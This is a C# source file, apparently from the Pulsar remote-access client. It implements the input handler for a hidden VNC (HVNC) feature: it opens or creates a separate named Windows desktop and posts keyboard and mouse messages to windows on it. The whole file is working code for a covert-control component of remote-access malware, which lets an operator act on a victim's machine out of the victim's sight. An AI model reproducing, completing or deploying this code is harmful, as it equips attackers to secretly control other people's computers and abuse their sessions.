using Pulsar.Common.Enums;
using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static Pulsar.Client.Utilities.NativeMethods;

namespace Pulsar.Client.Helper.HVNC
{
    public class InputHandler : IDisposable
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        public static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        public static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        public static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        public static extern bool PtInRect(ref RECT lprc, POINT pt);

        [DllImport("user32.dll")]
        public static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll")]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        public static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        public static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, POINT pt);

        [DllImport("user32.dll")]
        public static extern int GetMenuItemID(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        public static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);

        [DllImport("user32.dll")]
        static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

        public InputHandler(string DesktopName)
        {
            this.DesktopName = DesktopName;
            IntPtr intPtr = InputHandler.OpenDesktop(DesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (intPtr == IntPtr.Zero)
            {
                intPtr = InputHandler.CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            this.Desktop = intPtr;
        }

        public void Dispose()
        {
            InputHandler.CloseDesktop(this.Desktop);
            GC.Collect();
        }

        public static int GET_X_LPARAM(IntPtr lParam) => (int)(short)(lParam.ToInt32() & 0xFFFF);

        public static int GET_Y_LPARAM(IntPtr lParam) => (int)(short)(lParam.ToInt32() >> 16 & 0xFFFF);

        public static IntPtr MAKELPARAM(int lowWord, int highWord) => new IntPtr(highWord << 16 | (lowWord & 0xFFFF));

        public void Input(uint msg, IntPtr wParam, IntPtr lParam)
        {
            lock (lockObject)
            {
                SetThreadDesktop(this.Desktop);
                IntPtr hwndTarget = IntPtr.Zero;
                bool isMouseInput = false;
                POINT pt;

                if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                {
                    pt = this.lastPoint;
                    hwndTarget = WindowFromPoint(pt);
                }
                else
                {
                    isMouseInput = true;

                    int x = GET_X_LPARAM(lParam);
                    int y = GET_Y_LPARAM(lParam);

                    float dpiScale = 1.0f;
                    using (Graphics g = Graphics.FromHwnd(IntPtr.Zero))
                    {
                        dpiScale = g.DpiX / 96f;
                    }

                    pt.x = (int)(x * dpiScale);
                    pt.y = (int)(y * dpiScale);

                    this.lastPoint = pt;
                    hwndTarget = WindowFromPoint(pt);
                }

                IntPtr current = hwndTarget;
                do
                {
                    hwndTarget = current;
                    ScreenToClient(hwndTarget, ref pt);
                    current = ChildWindowFromPoint(hwndTarget, pt);
                }
                while (current != IntPtr.Zero && current != hwndTarget);

                if (isMouseInput)
                {
                    lParam = MAKELPARAM(pt.x, pt.y);
                }

                PostMessage(hwndTarget, msg, wParam, lParam);
            }
        }

        private const int GWL_STYLE = -16;
        private const int WS_DISABLED = 0x8000000;
        private const int WM_CHAR = 0x0102;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int WM_CLOSE = 0x0010;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_RESTORE = 0xF120;
        private const int SC_MAXIMIZE = 0xF030;
        private const int HTCAPTION = 2;
        private const int HTTOP = 12;
        private const int HTBOTTOM = 15;
        private const int HTLEFT = 10;
        private const int HTRIGHT = 11;
        private const int HTTOPLEFT = 13;
        private const int HTTOPRIGHT = 14;
        private const int HTBOTTOMLEFT = 16;
        private const int HTBOTTOMRIGHT = 17;
        private const int HTCLOSE = 20;
        private const int HTMINBUTTON = 8;
        private const int HTMAXBUTTON = 9;
        private const int HTTRANSPARENT = -1;
        private const int VK_RETURN = 0x0D;
        private const int MN_GETHMENU = 0x01E1;
        private const int BM_CLICK = 0x00F5;
        private const int MAX_PATH = 260;
        private const int WM_NCHITTEST = 0x0084;
        private const int SW_SHOWMAXIMIZED = 3;

        private POINT lastPoint = new POINT { x = 0, y = 0 };
        private static object lockObject = new object();
        private string DesktopName;
        public IntPtr Desktop = IntPtr.Zero;

        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        public struct POINT { public int x, y; }
        public struct RECT { public int left, top, right, bottom; }

        public struct WINDOWPLACEMENT
        {
            public int length, flags, showCmd;
            public POINT ptMinPosition, ptMaxPosition;
            public RECT rcNormalPosition;
        }
    }
}
